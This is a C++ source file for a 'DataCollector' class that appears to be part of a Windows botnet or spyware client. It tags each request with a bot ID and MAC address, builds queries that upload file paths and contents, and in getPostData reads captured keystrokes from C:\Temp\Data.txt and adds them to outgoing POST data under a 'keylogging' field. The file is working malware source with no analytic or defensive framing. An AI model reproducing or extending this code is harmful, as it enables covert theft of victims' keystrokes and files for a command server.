#include "DataCollector.h"
#include "UtilLib.h"
#include <iostream>

// Date constructor
DataCollector::DataCollector()
{
	keys = vector<string>();
	values = vector<string>();
	accessMutex = CreateMutex(NULL, true, NULL);
	if (accessMutex == NULL) {
		printf("DataCollector could not create its mutex\n");
	}
	ReleaseMutex(accessMutex);
}

void DataCollector::addDataPair(string action, string data, bool overwrite)
{
	// wait and lock the access mutex
	WaitForSingleObject(accessMutex, INFINITE);

	// get the index of this element in the key vector
	// if the element does not exist, elementPos should equal the size of the array
	int elementPos = find(keys.begin(), keys.end(), action) - keys.begin();
	// if the keys is already in the vector, modify its value
	if (overwrite && elementPos < values.size()) {
		// update the values in the vector with the new values
		values[elementPos] = data;
	}
	else {
		keys.push_back(action);
		values.push_back(data);
	}
	ReleaseMutex(accessMutex);
}

string DataCollector::getFileQuery(string filePath){
	string req = "";
	WaitForSingleObject(accessMutex, INFINITE);
	req = getArgsToString(keys, values, getSize(keys), { "mac_address", "bot_id" }, 2, "POST");
	req += "&file=";
	req += filePath;
	req += "&contents=";
	ReleaseMutex(accessMutex);
	return req;
}

// clears the key and value arrays, leaving only bot_id and mac, which are needed for every request
void DataCollector::dumpCollectedData(){
	// removes every key/value from the vectors except mac and bot_id
	WaitForSingleObject(accessMutex, INFINITE);
	for (int i = 0; i < keys.size(); i++) {
		if (keys[i] != "bot_id" && keys[i] != "mac_address") {
			keys.erase(keys.begin() + i);
			values.erase(values.begin() + i);
			i--;
		}
	}
	ReleaseMutex(accessMutex);
}

string DataCollector::getPostData() {
	string req = "";
	WaitForSingleObject(accessMutex, INFINITE);
	req = getArgsToString(keys, values, getSize(keys), keys, getSize(keys), "POST");
	char data[10000];
	memset(data, 0, 10000);
	readDataFromFile("C:\\Temp\\", "Data.txt", data, 10000);
	printf("data:1 %s\n", data);
	if (strcmp(data, "") != 0){
		printf("keylogging data: %s\n", data);
		req += "&keylogging=";
		req += data;
	}
	printf("end data: %s\n", req.c_str());
	ReleaseMutex(accessMutex);
	return req;
}

string DataCollector::getGetData() {
	string req = "";
	WaitForSingleObject(accessMutex, INFINITE);
	req = getArgsToString(keys, values, getSize(keys), { "mac_address", "bot_id" }, 2, "GET");
	ReleaseMutex(accessMutex);
	return req;
}
